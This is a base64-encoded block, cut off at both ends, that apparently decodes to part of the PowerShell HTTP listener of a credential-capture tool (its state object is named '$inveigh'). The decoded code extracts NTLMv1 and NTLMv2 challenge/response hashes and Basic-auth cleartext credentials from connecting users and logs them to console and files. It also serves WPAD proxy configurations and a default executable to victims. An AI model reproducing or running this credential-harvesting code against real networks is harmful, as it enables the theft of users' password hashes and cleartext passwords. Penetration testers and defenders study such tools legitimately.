ICAgICAgICAgICB9IAogICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICRIVFRQX05UTE1fdXNlcl9sZW5ndGggPSBEYXRhTGVuZ3RoMiAzNiAkSFRUUF9yZXF1ZXN0X2J5dGVzCiAgICAgICAgICAgICAgICAgICAgJEhUVFBfTlRMTV91c2VyX29mZnNldCA9IERhdGFMZW5ndGg0IDQwICRIVFRQX3JlcXVlc3RfYnl0ZXMKICAgICAgICAgICAgICAgICAgICAkSFRUUF9OVExNX3VzZXJfc3RyaW5nID0gRGF0YVRvU3RyaW5nICRIVFRQX05UTE1fdXNlcl9vZmZzZXQgJEhUVFBfTlRMTV91c2VyX2xlbmd0aCAkSFRUUF9yZXF1ZXN0X2J5dGVzCiAgICAgICAgICAgICAgICAgICAgJEhUVFBfTlRMTV9ob3N0X2xlbmd0aCA9IERhdGFMZW5ndGgyIDQ0ICRIVFRQX3JlcXVlc3RfYnl0ZXMKICAgICAgICAgICAgICAgICAgICAkSFRUUF9OVExNX2hvc3Rfb2Zmc2V0ID0gRGF0YUxlbmd0aDQgNDggJEhUVFBfcmVxdWVzdF9ieXRlcwogICAgICAgICAgICAgICAgICAgICRIVFRQX05UTE1faG9zdF9zdHJpbmcgPSBEYXRhVG9TdHJpbmcgJEhUVFBfTlRMTV9ob3N0X29mZnNldCAkSFRUUF9OVExNX2hvc3RfbGVuZ3RoICRIVFRQX3JlcXVlc3RfYnl0ZXMKICAgICAgICAKICAgICAgICAgICAgICAgICAgICBpZigkSFRUUF9OVExNX2xlbmd0aCAtZXEgMjQpICMgTlRMTXYxCiAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAkTlRMTV9yZXNwb25zZSA9IFtTeXN0ZW0uQml0Q29udmVydGVyXTo6VG9TdHJpbmcoJEhUVFBfcmVxdWVzdF9ieXRlc1soJEhUVFBfTlRMTV9vZmZzZXQgLSAyNCkuLigkSFRUUF9OVExNX29mZnNldCArICRIVFRQX05UTE1fbGVuZ3RoKV0pIC1yZXBsYWNlICItIiwiIgogICAgICAgICAgICAgICAgICAgICAgICAkTlRMTV9yZXNwb25zZSA9ICROVExNX3Jlc3BvbnNlLkluc2VydCg0OCwnOicpCiAgICAgICAgICAgICAgICAgICAgICAgICRIVFRQX05UTE1faGFzaCA9ICRIVFRQX05UTE1fdXNlcl9zdHJpbmcgKyAiOjoiICsgJEhUVFBfTlRMTV9kb21haW5fc3RyaW5nICsgIjoiICsgJE5UTE1fcmVzcG9uc2UgKyAiOiIgKyAkTlRMTV9jaGFsbGVuZ2UKICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgaWYoJE5UTE1fY2hhbGxlbmdlIC1hbmQgJE5UTE1fcmVzcG9uc2UgLWFuZCAoJGludmVpZ2gubWFjaGluZV9hY2NvdW50cyAtb3IgKCEkaW52ZWlnaC5tYWNoaW5lX2FjY291bnRzIC1hbmQgLW5vdCAkSFRUUF9OVExNX3VzZXJfc3RyaW5nLkVuZHNXaXRoKCckJykpKSkKICAgICAgICAgICAgICAgICAgICAgICAgeyAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRpbnZlaWdoLk5UTE12MV9saXN0LkFkZCgkSFRUUF9OVExNX2hhc2gpCgogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYoJGludmVpZ2guZmlsZV9vdXRwdXQpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJGludmVpZ2gubG9nX2ZpbGVfcXVldWUuQWRkKCIkKEdldC1EYXRlIC1mb3JtYXQgJ3MnKSAtICRIVFRQX3R5cGUgTlRMTXYxIGNoYWxsZW5nZS9yZXNwb25zZSBmb3IgJEhUVFBfTlRMTV9kb21haW5fc3RyaW5nXCRIVFRQX05UTE1fdXNlcl9zdHJpbmcgY2FwdHVyZWQgZnJvbSAkSFRUUF9zb3VyY2VfSVAoJEhUVFBfTlRMTV9ob3N0X3N0cmluZykiKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmKCRpbnZlaWdoLmxvZ19vdXRwdXQpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJGludmVpZ2gubG9nLkFkZCgiJChHZXQtRGF0ZSAtZm9ybWF0ICdzJykgLSAkSFRUUF90eXBlIE5UTE12MSBjaGFsbGVuZ2UvcmVzcG9uc2UgZm9yICRIVFRQX05UTE1fZG9tYWluX3N0cmluZ1wkSFRUUF9OVExNX3VzZXJfc3RyaW5nIGNhcHR1cmVkIGZyb20gJEhUVFBfc291cmNlX0lQKCRIVFRQX05UTE1faG9zdF9zdHJpbmcpIikKICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZighJGludmVpZ2guY29uc29sZV91bmlxdWUgLW9yICgkaW52ZWlnaC5jb25zb2xlX3VuaXF1ZSAtYW5kICRpbnZlaWdoLk5UTE12MV91c2VybmFtZV9saXN0IC1ub3Rjb250YWlucyAiJEhUVFBfc291cmNlX0lQICRIVFRQX05UTE1fZG9tYWluX3N0cmluZ1wkSFRUUF9OVExNX3VzZXJfc3RyaW5nIikpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJGludmVpZ2guY29uc29sZV9xdWV1ZS5BZGQoJChHZXQtRGF0ZSAtZm9ybWF0ICdzJykgKyAiIC0gJEhUVFBfdHlwZSBOVExNdjEgY2hhbGxlbmdlL3Jlc3BvbnNlIGNhcHR1cmVkIGZyb20gJEhUVFBfc291cmNlX0lQKCRIVFRQX05UTE1faG9zdF9zdHJpbmcpOmBuJEhUVFBfTlRMTV9oYXNoIikKICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkaW52ZWlnaC5jb25zb2xlX3F1ZXVlLkFkZCgkKEdldC1EYXRlIC1mb3JtYXQgJ3MnKSArICIgLSAkSFRUUF90eXBlIE5UTE12MSBjaGFsbGVuZ2UvcmVzcG9uc2UgY2FwdHVyZWQgZnJvbSAkSFRUUF9zb3VyY2VfSVAoJEhUVFBfTlRMTV9ob3N0X3N0cmluZyk6YG4kSFRUUF9OVExNX2RvbWFpbl9zdHJpbmdcJEhUVFBfTlRMTV91c2VyX3N0cmluZyAtIG5vdCB1bmlxdWUiKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmKCRpbnZlaWdoLmZpbGVfb3V0cHV0IC1hbmQgKCEkaW52ZWlnaC5maWxlX3VuaXF1ZSAtb3IgKCRpbnZlaWdoLmZpbGVfdW5pcXVlIC1hbmQgJGludmVpZ2guTlRMTXYxX3VzZXJuYW1lX2xpc3QgLW5vdGNvbnRhaW5zICIkSFRUUF9zb3VyY2VfSVAgJEhUVFBfTlRMTV9kb21haW5fc3RyaW5nXCRIVFRQX05UTE1fdXNlcl9zdHJpbmciKSkpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJGludmVpZ2guTlRMTXYxX2ZpbGVfcXVldWUuQWRkKCRIVFRQX05UTE1faGFzaCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkaW52ZWlnaC5jb25zb2xlX3F1ZXVlLkFkZCgiJEhUVFBfdHlwZSBOVExNdjEgY2hhbGxlbmdlL3Jlc3BvbnNlIHdyaXR0ZW4gdG8gIiArICRpbnZlaWdoLk5UTE12MV9vdXRfZmlsZSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZigkaW52ZWlnaC5OVExNdjFfdXNlcm5hbWVfbGlzdCAtbm90Y29udGFpbnMgIiRIVFRQX3NvdXJjZV9JUCAkSFRUUF9OVExNX2RvbWFpbl9zdHJpbmdcJEhUVFBfTlRMTV91c2VyX3N0cmluZyIpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJGludmVpZ2guTlRMTXYxX3VzZXJuYW1lX2xpc3QuQWRkKCIkSFRUUF9zb3VyY2VfSVAgJEhUVFBfTlRMTV9kb21haW5fc3RyaW5nXCRIVFRQX05UTE1fdXNlcl9zdHJpbmciKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgZWxzZSAjIE5UTE12MgogICAgICAgICAgICAgICAgICAgIHsgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgJE5UTE1fcmVzcG9uc2UgPSBbU3lzdGVtLkJpdENvbnZlcnRlcl06OlRvU3RyaW5nKCRIVFRQX3JlcXVlc3RfYnl0ZXNbJEhUVFBfTlRMTV9vZmZzZXQuLigkSFRUUF9OVExNX29mZnNldCArICRIVFRQX05UTE1fbGVuZ3RoKV0pIC1yZXBsYWNlICItIiwiIgogICAgICAgICAgICAgICAgICAgICAgICAkTlRMTV9yZXNwb25zZSA9ICROVExNX3Jlc3BvbnNlLkluc2VydCgzMiwnOicpCiAgICAgICAgICAgICAgICAgICAgICAgICRIVFRQX05UTE1faGFzaCA9ICRIVFRQX05UTE1fdXNlcl9zdHJpbmcgKyAiOjoiICsgJEhUVFBfTlRMTV9kb21haW5fc3RyaW5nICsgIjoiICsgJE5UTE1fY2hhbGxlbmdlICsgIjoiICsgJE5UTE1fcmVzcG9uc2UKCiAgICAgICAgICAgICAgICAgICAgICAgIGlmKCROVExNX2NoYWxsZW5nZSAtYW5kICROVExNX3Jlc3BvbnNlIC1hbmQgKCRpbnZlaWdoLm1hY2hpbmVfYWNjb3VudHMgLW9yICghJGludmVpZ2gubWFjaGluZV9hY2NvdW50cyAtYW5kIC1ub3QgJEhUVFBfTlRMTV91c2VyX3N0cmluZy5FbmRzV2l0aCgnJCcpKSkpCiAgICAgICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRpbnZlaWdoLk5UTE12Ml9saXN0LkFkZCgkSFRUUF9OVExNX2hhc2gpCgogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYoJGludmVpZ2guZmlsZV9vdXRwdXQpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJGludmVpZ2gubG9nX2ZpbGVfcXVldWUuQWRkKCQoR2V0LURhdGUgLWZvcm1hdCAncycpICsgIiAtICRIVFRQX3R5cGUgTlRMTXYyIGNoYWxsZW5nZS9yZXNwb25zZSBmb3IgJEhUVFBfTlRMTV9kb21haW5fc3RyaW5nXCRIVFRQX05UTE1fdXNlcl9zdHJpbmcgY2FwdHVyZWQgZnJvbSAkSFRUUF9zb3VyY2VfSVAoJEhUVFBfTlRMTV9ob3N0X3N0cmluZykiKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmKCRpbnZlaWdoLmxvZ19vdXRwdXQpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJGludmVpZ2gubG9nLkFkZCgkKEdldC1EYXRlIC1mb3JtYXQgJ3MnKSArICIgLSAkSFRUUF90eXBlIE5UTE12MiBjaGFsbGVuZ2UvcmVzcG9uc2UgZm9yICRIVFRQX05UTE1fZG9tYWluX3N0cmluZ1wkSFRUUF9OVExNX3VzZXJfc3RyaW5nIGNhcHR1cmVkIGZyb20gJEhUVFBfc291cmNlX0lQKCRIVFRQX05UTE1faG9zdF9zdHJpbmcpIikKICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZighJGludmVpZ2guY29uc29sZV91bmlxdWUgLW9yICgkaW52ZWlnaC5jb25zb2xlX3VuaXF1ZSAtYW5kICRpbnZlaWdoLk5UTE12Ml91c2VybmFtZV9saXN0IC1ub3Rjb250YWlucyAiJEhUVFBfc291cmNlX0lQICRIVFRQX05UTE1fZG9tYWluX3N0cmluZ1wkSFRUUF9OVExNX3VzZXJfc3RyaW5nIikpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJGludmVpZ2guY29uc29sZV9xdWV1ZS5BZGQoJChHZXQtRGF0ZSAtZm9ybWF0ICdzJykgKyAiIC0gJEhUVFBfdHlwZSBOVExNdjIgY2hhbGxlbmdlL3Jlc3BvbnNlIGNhcHR1cmVkIGZyb20gJEhUVFBfc291cmNlX0lQKCRIVFRQX05UTE1faG9zdF9zdHJpbmcpOmBuJEhUVFBfTlRMTV9oYXNoIikKICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkaW52ZWlnaC5jb25zb2xlX3F1ZXVlLkFkZCgkKEdldC1EYXRlIC1mb3JtYXQgJ3MnKSArICIgLSAkSFRUUF90eXBlIE5UTE12MiBjaGFsbGVuZ2UvcmVzcG9uc2UgY2FwdHVyZWQgZnJvbSAkSFRUUF9zb3VyY2VfSVAoJEhUVFBfTlRMTV9ob3N0X3N0cmluZyk6YG4kSFRUUF9OVExNX2RvbWFpbl9zdHJpbmdcJEhUVFBfTlRMTV91c2VyX3N0cmluZyAtIG5vdCB1bmlxdWUiKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmKCRpbnZlaWdoLmZpbGVfb3V0cHV0IC1hbmQgKCEkaW52ZWlnaC5maWxlX3VuaXF1ZSAtb3IgKCRpbnZlaWdoLmZpbGVfdW5pcXVlIC1hbmQgJGludmVpZ2guTlRMTXYyX3VzZXJuYW1lX2xpc3QgLW5vdGNvbnRhaW5zICIkSFRUUF9zb3VyY2VfSVAgJEhUVFBfTlRMTV9kb21haW5fc3RyaW5nXCRIVFRQX05UTE1fdXNlcl9zdHJpbmciKSkpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJGludmVpZ2guTlRMTXYyX2ZpbGVfcXVldWUuQWRkKCRIVFRQX05UTE1faGFzaCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkaW52ZWlnaC5jb25zb2xlX3F1ZXVlLkFkZCgiJEhUVFBfdHlwZSBOVExNdjIgY2hhbGxlbmdlL3Jlc3BvbnNlIHdyaXR0ZW4gdG8gIiArICRpbnZlaWdoLk5UTE12Ml9vdXRfZmlsZSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZigkaW52ZWlnaC5OVExNdjJfdXNlcm5hbWVfbGlzdCAtbm90Y29udGFpbnMgIiRIVFRQX3NvdXJjZV9JUCAkSFRUUF9OVExNX2RvbWFpbl9zdHJpbmdcJEhUVFBfTlRMTV91c2VyX3N0cmluZyIpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJGludmVpZ2guTlRMTXYyX3VzZXJuYW1lX2xpc3QuQWRkKCIkSFRUUF9zb3VyY2VfSVAgJEhUVFBfTlRMTV9kb21haW5fc3RyaW5nXCRIVFRQX05UTE1fdXNlcl9zdHJpbmciKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgICAgIGlmICgkaW52ZWlnaC5JUF9jYXB0dXJlX2xpc3QgLW5vdGNvbnRhaW5zICRIVFRQX3NvdXJjZV9JUCAtYW5kIC1ub3QgJEhUVFBfTlRMTV91c2VyX3N0cmluZy5FbmRzV2l0aCgnJCcpIC1hbmQgISRpbnZlaWdoLnNwb29mZXJfcmVwZWF0IC1hbmQgJEhUVFBfc291cmNlX0lQIC1uZSAkSVApCiAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAkaW52ZWlnaC5JUF9jYXB0dXJlX2xpc3QuQWRkKCRIVFRQX3NvdXJjZV9JUCkKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAkSFRUUF9yZXNwb25zZV9zdGF0dXNfY29kZSA9IDB4MzIsMHgzMCwweDMwCiAgICAgICAgICAgICAgICAgICAgJEhUVFBfcmVzcG9uc2VfcGhyYXNlID0gMHg0ZiwweDRiCiAgICAgICAgICAgICAgICAgICAgJEhUVFBfY2xpZW50X2Nsb3NlID0gJHRydWUKICAgICAgICAgICAgICAgICAgICAkTlRMTV9jaGFsbGVuZ2UgPSAiIgoKICAgICAgICAgICAgICAgICAgICBpZigkcHJveHlfbGlzdGVuZXIpCiAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgaWYoJEhUVFBSZXNwb25zZSAtb3IgJEhUVFBEaXIpCiAgICAgICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRIVFRQX2hlYWRlcl9jYWNoZV9jb250cm9sID0gMHg0MywweDYxLDB4NjMsMHg2OCwweDY1LDB4MmQsMHg0MywweDZmLDB4NmUsMHg3NCwweDcyLDB4NmYsMHg2YywweDNhLDB4MjAsMHg2ZSwweDZmLDB4MmQsMHg2MywweDYxLDB4NjMsMHg2OCwweDY1LDB4MmMsMHgyMCwweDZlLDB4NmYsMHgyZCwweDczLDB4NzQsMHg2ZiwweDcyLDB4NjUKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRIVFRQX3NlbmQgPSAkZmFsc2UKICAgICAgICAgICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICRIVFRQX2NsaWVudF9jbG9zZSA9ICR0cnVlCiAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICB9CiAgICAgICAgICAgIGVsc2VpZigkSFRUUF9oZWFkZXJfYXV0aG9yaXphdGlvbi5zdGFydHN3aXRoKCdCYXNpYyAnKSkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgJEhUVFBfcmVzcG9uc2Vfc3RhdHVzX2NvZGUgPSAweDMyLDB4MzAsMHgzMAogICAgICAgICAgICAgICAgJEhUVFBfcmVzcG9uc2VfcGhyYXNlID0gMHg0ZiwweDRiCiAgICAgICAgICAgICAgICAkSFRUUF9oZWFkZXJfYXV0aG9yaXphdGlvbiA9ICRIVFRQX2hlYWRlcl9hdXRob3JpemF0aW9uIC1yZXBsYWNlICdCYXNpYyAnLCcnCiAgICAgICAgICAgICAgICAkY2xlYXJ0ZXh0X2NyZWRlbnRpYWxzID0gW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VVRGOC5HZXRTdHJpbmcoW1N5c3RlbS5Db252ZXJ0XTo6RnJvbUJhc2U2NFN0cmluZygkSFRUUF9oZWFkZXJfYXV0aG9yaXphdGlvbikpCiAgICAgICAgICAgICAgICAkSFRUUF9jbGllbnRfY2xvc2UgPSAkdHJ1ZQogICAgICAgICAgICAgICAgJGludmVpZ2guY2xlYXJ0ZXh0X2ZpbGVfcXVldWUuQWRkKCRjbGVhcnRleHRfY3JlZGVudGlhbHMpCiAgICAgICAgICAgICAgICAkaW52ZWlnaC5jbGVhcnRleHRfbGlzdC5BZGQoJGNsZWFydGV4dF9jcmVkZW50aWFscykKICAgICAgICAgICAgICAgICRpbnZlaWdoLmNvbnNvbGVfcXVldWUuQWRkKCIkKEdldC1EYXRlIC1mb3JtYXQgJ3MnKSAtICRIVFRQX3R5cGUgQmFzaWMgYXV0aCBjbGVhcnRleHQgY3JlZGVudGlhbHMgJGNsZWFydGV4dF9jcmVkZW50aWFscyBjYXB0dXJlZCBmcm9tICRIVFRQX3NvdXJjZV9JUCIpCgogICAgICAgICAgICAgICAgaWYoJGludmVpZ2guZmlsZV9vdXRwdXQpCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgJGludmVpZ2guY29uc29sZV9xdWV1ZS5BZGQoIiRIVFRQX3R5cGUgQmFzaWMgYXV0aCBjbGVhcnRleHQgY3JlZGVudGlhbHMgd3JpdHRlbiB0byAiICsgJGludmVpZ2guY2xlYXJ0ZXh0X291dF9maWxlKQogICAgICAgICAgICAgICAgICAgICRpbnZlaWdoLmxvZ19maWxlX3F1ZXVlLkFkZCgiJChHZXQtRGF0ZSAtZm9ybWF0ICdzJykgLSBCYXNpYyBhdXRoIGNsZWFydGV4dCBjcmVkZW50aWFscyBjYXB0dXJlZCBmcm9tICRIVFRQX3NvdXJjZV9JUCIpCiAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgaWYoJGludmVpZ2gubG9nX291dHB1dCkKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAkaW52ZWlnaC5sb2cuQWRkKCIkKEdldC1EYXRlIC1mb3JtYXQgJ3MnKSAtIEJhc2ljIGF1dGggY2xlYXJ0ZXh0IGNyZWRlbnRpYWxzIGNhcHR1cmVkIGZyb20gJEhUVFBfc291cmNlX0lQIikKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgfQoKICAgICAgICAgICAgaWYoKCRIVFRQX3JlcXVlc3RfcmF3X3VybCAtbm90bWF0Y2ggJy93cGFkLmRhdCcgLWFuZCAkSFRUUEF1dGggLWVxICdBbm9ueW1vdXMnKSAtb3IgKCRIVFRQX3JlcXVlc3RfcmF3X1VSTCAtbWF0Y2ggJy93cGFkLmRhdCcgLWFuZCAkV1BBREF1dGggLWVxICdBbm9ueW1vdXMnKSAtb3IgKAogICAgICAgICAgICAkV1BBREF1dGhJZ25vcmUuQ291bnQgLWd0IDAgLWFuZCAkV1BBREF1dGggLWxpa2UgJ05UTE0qJyAtYW5kICgkV1BBREF1dGhJZ25vcmUgfCBXaGVyZS1PYmplY3QgeyRIVFRQX2hlYWRlcl91c2VyX2FnZW50IC1tYXRjaCAkX30pKSAtb3IgJEhUVFBfY2xpZW50X2Nsb3NlKQogICAgICAgICAgICB7CgogICAgICAgICAgICAgICAgaWYoJEhUVFBEaXIgLWFuZCAkSFRUUERlZmF1bHRFWEUgLWFuZCAkSFRUUF9yZXF1ZXN0X3Jhd191cmwgLWxpa2UgJyouZXhlJyAtYW5kIChUZXN0LVBhdGggKEpvaW4tUGF0aCAkSFRUUERpciAkSFRUUERlZmF1bHRFWEUpKSAtYW5kICEoVGVzdC1QYXRoIChKb2luLVBhdGggJEhUVFBEaXIgJEhUVFBfcmVxdWVzdF9yYXdfdXJsKSkpCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgW0J5dGVbXV0kSFRUUF9tZXNzYWdlX2J5dGVzID0gW1N5c3RlbS5JTy5GaWxlXTo6UmVhZEFsbEJ5dGVzKChKb2luLVBhdGggJEhUVFBEaXIgJEhUVFBEZWZhdWx0RVhFKSkKICAgICAgICAgICAgICAgICAgICAkSFRUUF9oZWFkZXJfY29udGVudF90eXBlID0gMHg0MywweDZmLDB4NmUsMHg3NCwweDY1LDB4NmUsMHg3NCwweDJkLDB4NTQsMHg3OSwweDcwLDB4NjUsMHgzYSwweDIwICsgW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VVRGOC5HZXRCeXRlcygiYXBwbGljYXRpb24vZXhlIikKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGVsc2VpZigkSFRUUERpcikKICAgICAgICAgICAgICAgIHsKCiAgICAgICAgICAgICAgICAgICAgaWYoJEhUVFBEZWZhdWx0RmlsZSAtYW5kICEoVGVzdC1QYXRoIChKb2luLVBhdGggJEhUVFBEaXIgJEhUVFBfcmVxdWVzdF9yYXdfdXJsKSkgLWFuZCAoVGVzdC1QYXRoIChKb2luLVBhdGggJEhUVFBEaXIgJEhUVFBEZWZhdWx0RmlsZSkpIC1hbmQgJEhUVFBfcmVxdWVzdF9yYXdfdXJsIC1ub3RtYXRjaCAnL3dwYWQuZGF0JykKICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgIFtCeXRlW11dJEhUVFBfbWVzc2FnZV9ieXRlcyA9IFtTeXN0ZW0uSU8uRmlsZV06OlJlYWRBbGxCeXRlcygoSm9pbi1QYXRoICRIVFRQRGlyICRIVFRQRGVmYXVsdEZpbGUpKQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBlbHNlaWYoKCRIVFRQRGVmYXVsdEZpbGUgLWFuZCAkSFRUUF9yZXF1ZXN0X3Jhd191cmwgLWVxICcnIC1vciAkSFRUUERlZmF1bHRGaWxlIC1hbmQgJEhUVFBfcmVxdWVzdF9yYXdfdXJsIC1lcSAnLycpIC1hbmQgKFRlc3QtUGF0aCAoSm9pbi1QYXRoICRIVFRQRGlyICRIVFRQRGVmYXVsdEZpbGUpKSkKICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgIFtCeXRlW11dJEhUVFBfbWVzc2FnZV9ieXRlcyA9IFtTeXN0ZW0uSU8uRmlsZV06OlJlYWRBbGxCeXRlcygoSm9pbi1QYXRoICRIVFRQRGlyICRIVFRQRGVmYXVsdEZpbGUpKQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBlbHNlaWYoJFdQQURSZXNwb25zZSAtYW5kICRIVFRQX3JlcXVlc3RfcmF3X3VybCAtbWF0Y2ggJy93cGFkLmRhdCcpCiAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICBbQnl0ZVtdXSRIVFRQX21lc3NhZ2VfYnl0ZXMgPSBbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVVEY4LkdldEJ5dGVzKCRXUEFEUmVzcG9uc2UpCiAgICAgICAgICAgICAgICAgICAgICAgICRIVFRQX2hlYWRlcl9jb250ZW50X3R5cGUgPSAweDQzLDB4NmYsMHg2ZSwweDc0LDB4NjUsMHg2ZSwweDc0LDB4MmQsMHg1NCwweDc5LDB4NzAsMHg2NSwweDNhLDB4MjAgKyBbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVVEY4LkdldEJ5dGVzKCJhcHBsaWNhdGlvbi94LW5zLXByb3h5LWF1dG9jb25maWciKQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICAgICAgewoKICAgICAgICAgICAgICAgICAgICAgICAgaWYoVGVzdC1QYXRoIChKb2luLVBhdGggJEhUVFBEaXIgJEhUVFBfcmVxdWVzdF9yYXdfdXJsKSkKICAgICAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgW0J5dGVbXV0kSFRUUF9tZXNzYWdlX2J5dGVzID0gW1N5c3RlbS5JTy5GaWxlXTo6UmVhZEFsbEJ5dGVzKChKb2luLVBhdGggJEhUVFBEaXIgJEhUVFBfcmVxdWVzdF9yYXdfdXJsKSkKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIFtCeXRlW11dJEhUVFBfbWVzc2FnZV9ieXRlcyA9IFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVURjguR2V0Qnl0ZXMoJEhUVFBSZXNwb25zZSkKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgaWYoJFdQQURSZXNwb25zZSAtYW5kICRIVFRQX3JlcXVlc3RfcmF3X3VybCAtbWF0Y2ggJy93cGFkLmRhdCcgLWFuZCAoISRQcm94eUlnbm9yZSAtb3IgISgkUHJveHlJZ25vcmUgfCBXaGVyZS1PYmplY3QgeyRIVFRQX2hlYWRlcl91c2VyX2FnZW50IC1tYXRjaCAkX30pKSkKICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICRIVFRQX21lc3NhZ2UgPSAkV1BBRFJlc3BvbnNlCiAgICAgICAgICAgICAgICAgICAgICAgICRIVFRQX2hlYWRlcl9jb250ZW50X3R5cGUgPSAweDQzLDB4NmYsMHg2ZSwweDc0LDB4NjUsMH